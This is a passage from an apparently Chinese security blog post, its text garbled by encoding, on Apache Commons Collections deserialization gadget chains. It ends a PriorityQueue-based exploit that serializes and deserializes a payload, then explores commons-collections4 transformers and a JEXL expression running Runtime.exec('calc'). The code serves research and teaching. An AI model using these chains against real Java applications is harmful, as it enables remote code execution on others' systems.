</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>åˆ°è¿™é‡Œå¸¸è§„çš„CCé“¾å°±å®Œç»“äº†</p>
<h1 id="0x03-å­˜æ¡£æŒ–æ˜">0x03 å­˜æ¡£æŒ–æ˜<a hidden class="anchor" aria-hidden="true" href="#0x03-å­˜æ¡£æŒ–æ˜">#</a></h1>
<p>å°è¯•æŒ–æ˜ï¼Œä¸€å¼€å§‹æ˜¯æƒ³çœ‹æ‰¾<code>commons-collections4.4</code>ä¾èµ–çš„é“¾å­çš„ï¼ŒæŸ¥çœ‹å‘ç°ï¼ˆåŒæ—¶ç»§æ‰¿<code>Serializable</code>ï¼‰å¯ä»¥ç”¨çš„å¹¶ä¸å¤šã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ClosureTransformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iClosure</span><span class="p">.</span><span class="na">execute</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ConstantTransformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iConstant</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">FactoryTransformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iFactory</span><span class="p">.</span><span class="na">create</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	
</span></span></span><span class="line"><span class="cl"><span class="w">	
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">IfTransformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">iPredicate</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">input</span><span class="p">)){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">iTrueTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iFalseTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	
</span></span></span><span class="line"><span class="cl"><span class="w">	
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mapTransformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iMap</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿›è¡Œæœ‰äº›æœç´¢ï¼Œçœ‹åˆ°<code>evaluate</code>æ–¹æ³•ï¼Œå¯ä»¥æ‰§è¡Œ<a href="https://xz.aliyun.com/t/8099?u_atoken=8f40961b7b767250cd2ccc2fe03355e9&u_asig=0a472f9117313988038761313e0039#toc-1">JEXLè¡¨è¾¾å¼</a></p>
<p>å¾ˆé—æ†¾<code>org.apache.commons.jexl3.internal.Script</code>æ²¡æœ‰ç»§æ‰¿<code>Serializable</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">Exp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;233.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;calc&#39;)&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">JexlEngine</span><span class="w"> </span><span class="n">engine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JexlBuilder</span><span class="p">().</span><span class="na">create</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">JexlExpression</span><span class="w"> </span><span class="n">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">engine</span><span class="p">.</span><span class="na">createExpression</span><span class="p">(</span><span class="n">Exp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">JexlContext</span><span class="w"> </span><span class="n">Context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MapContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Expression</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">Context</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>ç›®å‰CCé“¾å…ˆåˆ°è¿™é‡Œå§ï¼Œç„¶åå…¶ä»–çš„ä¸€äº›CCé“¾ç»•è¿‡æˆ–è€…æ„é€ å¯ä»¥å‚è€ƒä¸‹è¿™ä¸ª<a href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-SerialKiller.html#%E4%BB%A3%E6%9B%BF-constanttransformer">SerialKillerç»•è¿‡</a>ï¼Œä¸è¿‡åŸºæœ¬éƒ½æ˜¯æ›¿æ¢ä¸­é—´gadgetï¼Œæ²¡æœ‰æºå¤´å’Œç»“å°¾çš„åˆ©ç”¨</p>
<p>å‚è€ƒï¼š</p>
<blockquote>
<p><a href="https://w0s1np.github.io/blog/commonscollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html">https://w0s1np.github.io/blog/commonscollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html</a></p>
<p><a href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-SerialKiller/">SerialKillerç»•è¿‡</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>jacksonåŸç”Ÿé“¾</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>Tomcat Filterå†…å­˜é©¬</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
